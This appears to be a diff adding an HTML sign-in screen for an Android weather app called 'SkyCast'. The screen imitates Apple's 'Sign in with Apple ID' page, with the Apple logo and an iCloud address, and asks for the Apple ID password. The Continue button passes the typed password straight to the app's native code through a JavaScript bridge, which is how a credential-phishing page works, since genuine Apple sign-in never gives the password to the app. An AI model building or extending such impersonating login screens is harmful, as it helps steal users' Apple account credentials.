@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+
+<html class="light" lang="en"><head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>SkyCast - Sign In</title>
+    <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&amp;family=Inter:wght@400;500;600&amp;display=swap" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+    <script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    "colors": {
+                        "primary": "#006591", "primary-container": "#0ea5e9", "on-primary": "#ffffff",
+                        "surface": "#f7f9fb", "on-surface": "#191c1e", "on-surface-variant": "#3e4850",
+                        "outline": "#6e7881", "background": "#f7f9fb",
+                        "surface-container-low": "#f2f4f6", "primary-fixed": "#c9e6ff"
+                    },
+                    "borderRadius": { "DEFAULT": "0.25rem", "lg": "0.5rem", "xl": "1.5rem", "full": "9999px" },
+                    "fontFamily": { "headline": ["Plus Jakarta Sans"], "body": ["Inter"] }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+        h1, h2, h3, .headline { font-family: 'Plus Jakarta Sans', sans-serif; }
+        .glass-panel { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); }
+        .atmospheric-bg { background: linear-gradient(180deg, #006591 0%, #0ea5e9 40%, #f7f9fb 100%); }
+        .material-symbols-outlined { font-variation-settings: 'FILL' 0, 'wght' 300, 'GRAD' 0, 'opsz' 24; }
+    </style>
+</head>
+<body class="bg-background text-on-background min-h-screen flex items-center justify-center p-0 m-0 overflow-hidden">
+<div class="relative w-[390px] h-[847px] atmospheric-bg shadow-2xl overflow-hidden flex flex-col">
+    <main class="relative flex-1 flex flex-col items-center justify-between px-8 py-16 z-10">
+        <div class="w-full flex flex-col items-center space-y-6 text-center mt-8">
+            <div class="w-20 h-20 glass-panel rounded-3xl flex items-center justify-center shadow-sm">
+                <span class="material-symbols-outlined text-primary text-5xl" style="font-variation-settings: 'FILL' 1;">cloud</span>
+            </div>
+            <div class="space-y-2">
+                <h1 class="text-3xl font-extrabold tracking-tighter text-white">SkyCast</h1>
+                <p class="text-white/80 font-medium tracking-wide">Sign in with Apple ID</p>
+            </div>
+        </div>
+
+        <div class="w-full glass-panel rounded-[2rem] p-8 space-y-8 shadow-xl">
+            <div class="flex items-center space-y-4 flex-col">
+                <div class="text-5xl text-on-surface">
+                    <svg fill="currentColor" height="48" viewbox="0 0 384 512" width="48" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"></path>
+                    </svg>
+                </div>
+                <p class="text-on-surface-variant font-body text-sm font-medium">user@icloud.com</p>
+            </div>
+
+            <div class="space-y-4">
+                <div class="relative">
+                    <!-- ✅ Added ID to Password input -->
+                    <input id="applePassword" class="w-full h-14 px-6 bg-surface-container-low border-0 rounded-2xl focus:ring-2 focus:ring-primary-container text-on-surface placeholder:text-outline text-lg transition-all" placeholder="Password" type="password"/>
+                </div>
+            </div>
+
+            <button onclick="Android.onAppleSignInAttempt(document.getElementById('applePassword').value)" class="w-full h-14 bg-gradient-to-r from-primary to-primary-container text-on-primary font-bold rounded-full shadow-lg active:scale-[0.98] transition-all flex items-center justify-center">
+                Continue
+            </button>
+        </div>
+
+        <div class="w-full flex flex-col items-center space-y-4">
+            <button onclick="Android.onForgotPassword()" class="text-white/70 text-sm font-medium hover:text-white transition-colors">Forgot password?</button>
+            <button onclick="Android.onGoBackToLogin()" class="text-white/70 text-sm font-medium hover:text-white transition-colors">Cancel</button>
+        </div>
+    </main>
+</div>
+</body></html>
